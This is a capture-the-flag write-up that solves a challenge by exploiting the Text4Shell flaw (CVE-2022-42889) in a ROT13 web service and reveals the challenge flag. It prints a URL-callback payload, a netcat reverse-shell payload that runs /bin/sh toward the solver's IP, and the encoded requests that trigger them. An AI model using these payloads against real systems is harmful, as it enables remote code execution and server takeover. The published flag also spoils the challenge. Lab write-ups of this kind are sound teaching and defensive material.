# [HV22.09] Santa's Text

<table>
  <tr>
    <th>Categories</th>
    <td>Penetration testing</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>medium</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>yuva</td>
  </tr>
</table>

## Description

Santa recently created some Text with a 🐚, which is said to be vulnerable code. Santa has put this Text in his library, putting the library in danger. He doesn't know yet that this could pose a risk to his server. Can you backdoor the server and find all of Santa's secrets?


## Solution
The service does a ROT13 on the entered text.

Changing query params to the following produces an error page that looks like a Java/Tomcat (or similar) error page: 
```
https://<host>/santa/attack?search=((%3E%22\\)&bla=9843u53SF
```

Reading the description again, there's a clear hint towards "Text4Shell", one of the big Java library vulnerabilities, this year with the CVE number [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889).

A simple way to confirm Text4Shell, is to issue a http request to my own machine ([source](https://www.neosec.com/blog/vulnerability-explained-remote-code-execution-through-text4shell)).

But first, since the network elves have done their work and machine cannot talk to the outside, I had to connect to the CTF VPN first.
2h later (see "Notes" below), I was able to receive requests from the vulnerable machine.

So, I spun up a listening netcat (`nc -l 9090`) and used the following payload to provoke a http request in return:
```
${url:UTF-8:http://10.13.0.26:9090}
```

The ROT13 part requires us to either copy&paste the first input or to apply ROT13 before sending the payload. The final request triggering this callback looks as follows:
```
https://<host>/santa/attack?search=grfg%24%7Bhey%3AHGS-8%3Auggc%3A%2F%2F10.13.0.26%3A9090%7D
```
With this, `nc` prints out the incoming request (Don't forget to disable the firewall! ;) ):
```
GET / HTTP/1.1
User-Agent: Java/13.0.12
Host: 10.13.0.26:9090
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

Yay, so the Text4Shell bit is right. Now let's try to get a reverse shell with the following payload ([source](https://cloudsecurityalliance.org/blog/2022/12/02/detecting-and-mitigating-cve-2022-42889-a-k-a-text4shell/)):
```
${script:javascript:java.lang.Runtime.getRuntime().exec('nc 10.13.0.26 9090 -e /bin/sh')}
```

Resulting in the explointing request: 
```
https://<host>/santa/attack?search=%24%7Bfpevcg%3Awninfpevcg%3Awnin.ynat.Ehagvzr.trgEhagvzr%28%29.rkrp%28%27ap+10.13.0.26+9090+-r+%2Fova%2Ffu%27%29%7D
```

Typing in `ls` on our `nc` session discloses that the server has connected by listing a few files.
After some browsing around on the server, we can find the flag at `/SANTA/FLAG.txt`.
```sh
cat /SANTA/FLAG.txt
HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}
```

### Links
- https://www.docker.com/blog/security-advisory-cve-2022-42889-text4shell/
- https://www.neosec.com/blog/vulnerability-explained-remote-code-execution-through-text4shell
- https://cloudsecurityalliance.org/blog/2022/12/02/detecting-and-mitigating-cve-2022-42889-a-k-a-text4shell/

## Notes
HL VPN did not work through my home router. It finally worked through my mobile hotspot. (which is weirdo, Swisscom! No fingerpointing, plz).

## Flag
```
HV22{th!s_Text_5h€LL_Com€5_₣₹0M_SANTAA!!}
```
